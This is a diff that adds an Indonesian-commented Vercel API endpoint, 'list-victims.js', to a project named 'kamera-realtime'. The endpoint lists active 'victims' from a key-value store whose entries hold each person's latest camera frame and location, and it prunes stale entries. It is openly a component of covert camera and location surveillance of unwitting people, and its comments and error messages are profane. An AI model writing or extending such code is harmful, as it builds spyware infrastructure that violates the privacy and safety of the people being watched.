@@ -1,0 +1,32 @@
+// api/list-victims.js (di project kamera-realtime)
+import { kv } from '@vercel/kv';
+
+export default async function handler(req, res) {
+    if (req.method !== 'GET') {
+        return res.status(405).send('Metode tidak diizinkan, bajingan!');
+    }
+
+    try {
+        // Ambil semua anggota dari set 'activeVictims'
+        const activeVictims = await kv.smembers('activeVictims');
+        // Filter korban yang mungkin sudah expired (walaupun KV auto-expire, ini jaga-jaga)
+        const currentVictims = [];
+        for (const victimId of activeVictims) {
+            const lastUpdate = await kv.get(`victim:${victimId}:lastUpdate`);
+            // Jika ada update dalam 5 menit terakhir, anggap aktif
+            if (lastUpdate && (Date.now() - lastUpdate) < (5 * 60 * 1000 + 5000)) { // 5 menit + 5 detik buffer
+                currentVictims.push(victimId);
+            } else {
+                // Hapus dari daftar aktif kalo udah kelamaan gak ada update
+                await kv.srem('activeVictims', victimId);
+                await kv.del(`victim:${victimId}:lastFrame`);
+                await kv.del(`victim:${victimId}:location`);
+            }
+        }
+
+        res.status(200).json({ victims: currentVictims });
+    } catch (error) {
+        console.error('Gagal daftar korban, anjing:', error);
+        res.status(500).send('Kesalahan server, keparat!');
+    }
+}
